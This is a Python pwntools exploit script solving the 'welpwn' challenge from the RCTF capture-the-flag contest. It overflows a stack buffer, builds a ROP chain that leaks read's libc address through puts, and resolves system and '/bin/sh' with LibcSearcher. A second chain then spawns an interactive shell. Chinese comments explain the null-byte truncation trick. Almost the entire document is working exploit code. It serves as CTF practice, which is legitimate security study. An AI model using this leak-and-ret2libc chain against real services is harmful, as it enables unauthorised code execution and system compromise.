from pwn import *
from LibcSearcher import *
context.log_level = 'debug'

#r = remote('111.198.29.45', 35448)
r = process('./welpwn')
elf = ELF('./welpwn')

puts_plt = elf.plt['puts']
read_got = elf.got['read']
main = elf.sym['main']
pop_rdi = 0x4008a3
pop_r12_r13_r14_r15 = 0x40089c

payload = 'a'*(16+8) + p64(pop_r12_r13_r14_r15) + p64(pop_rdi) + p64(read_got) + p64(puts_plt) + p64(main)
##strcmp遇到00会停止，rop不能全部赋值进小的数组中，当函数返回的时候，距离栈顶4个单位以后是main函数的栈，
##并且第五行栈正好就是我们构造的rop链，将前四个pop进寄存器中，利用pop_r12_r13_r14_r15的ret就能成功rop

#gdb.attach(r)
r.recvuntil("Welcome to RCTF")
r.send(payload)

r.recvuntil('aaaaaaaaaaaaaaaaaaaaaaaa')
r.recv(3)

read_addr = u64(r.recv(6).ljust(8, '\x00'))
print hex(read_addr)

obj = LibcSearcher("read", read_addr)
base = read_addr - obj.dump("read")
system = obj.dump("system") + base
binsh = obj.dump("str_bin_sh") + base

payload = 'a'*(16+8) + p64(pop_r12_r13_r14_r15)+ p64(pop_rdi) + p64(binsh) + p64(system) + p64(main)

#r.recvuntil("Welcome to RCTF")
r.send(payload)


r.interactive()



